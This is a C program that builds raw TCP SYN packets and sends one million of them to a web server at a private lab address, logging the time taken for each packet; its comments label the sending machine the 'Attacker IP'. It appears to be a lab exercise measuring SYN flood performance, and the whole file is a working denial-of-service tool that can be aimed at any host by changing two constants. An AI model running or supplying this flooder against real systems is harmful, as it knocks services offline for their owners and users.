#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/time.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/socket.h>

struct pseudo_header {
    u_int32_t src_addr;
    u_int32_t dst_addr;
    u_int8_t reserved;
    u_int8_t protocol;
    u_int16_t tcp_length;
};

unsigned short checksum(unsigned short *ptr, int nbytes) {
    long sum = 0;
    unsigned short oddbyte;
    short answer;

    while(nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }

    if(nbytes == 1) {
        oddbyte = 0;
        *((u_char*)&oddbyte) = *(u_char*)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = (short)~sum;

    return answer;
}

long get_microseconds() {
    struct timeval tv;
    gettimeofday(&tv, NULL);
    return (tv.tv_sec * 1000000L + tv.tv_usec);
}

int main() {
    int sock;
    char packet[4096];
    struct iphdr *iph = (struct iphdr *) packet;
    struct tcphdr *tcph = (struct tcphdr *) (packet + sizeof(struct iphdr));
    struct sockaddr_in sin;
    struct pseudo_header psh;
    char pseudo_packet[4096];

    FILE *log = fopen("syns_results_c.txt", "w");
    if (!log) {
        perror("Failed to open log file");
        exit(1);
    }

    // CONFIGURATION
    char target_ip[] = "192.168.6.145";       // Apache server IP
    char my_ip[] = "192.168.6.128";           // Attacker IP
    int target_port = 80;
    int packet_count = 1000000;

    // Create raw socket
    sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if(sock < 0) {
        perror("Socket error");
        exit(1);
    }

    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("Error setting IP_HDRINCL");
        exit(1);
    }

    // Setup destination
    sin.sin_family = AF_INET;
    sin.sin_port = htons(target_port);
    sin.sin_addr.s_addr = inet_addr(target_ip);

    // Setup constant headers
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;
    iph->saddr = inet_addr(my_ip);
    iph->daddr = sin.sin_addr.s_addr;

    tcph->dest = htons(target_port);
    tcph->ack_seq = 0;
    tcph->doff = 5;
    tcph->syn = 1;
    tcph->window = htons(5840);
    tcph->urg_ptr = 0;

    psh.dst_addr = iph->daddr;
    psh.reserved = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(sizeof(struct tcphdr));

    long start_all = get_microseconds();

    for(int i = 0; i < packet_count; i++) {
        long start = get_microseconds();

        iph->id = htons(rand() % 65535);
        iph->check = 0;
        iph->check = checksum((unsigned short *) packet, sizeof(struct iphdr));

        tcph->source = htons(rand() % 65535);
        tcph->seq = htonl(rand());
        tcph->check = 0;

        psh.src_addr = iph->saddr; // Source IP
        memcpy(pseudo_packet, &psh, sizeof(struct pseudo_header));
        memcpy(pseudo_packet + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr));
        tcph->check = checksum((unsigned short*) pseudo_packet, sizeof(struct pseudo_header) + sizeof(struct tcphdr));

        sendto(sock, packet, sizeof(struct iphdr) + sizeof(struct tcphdr), 0,
               (struct sockaddr *) &sin, sizeof(sin));

        long end = get_microseconds();
        fprintf(log, "%d %ld\n", i + 1, end - start);
    }

    long end_all = get_microseconds();
    long total_time = end_all - start_all;
    long avg_time = total_time / packet_count;

    fprintf(log, "Total time: %ld microseconds\n", total_time);
    fprintf(log, "Average time: %ld microseconds\n", avg_time);
    fclose(log);

    close(sock);
    printf("Done sending %d SYN packets. Results saved to syns_results_c.txt\n", packet_count);
    return 0;
}
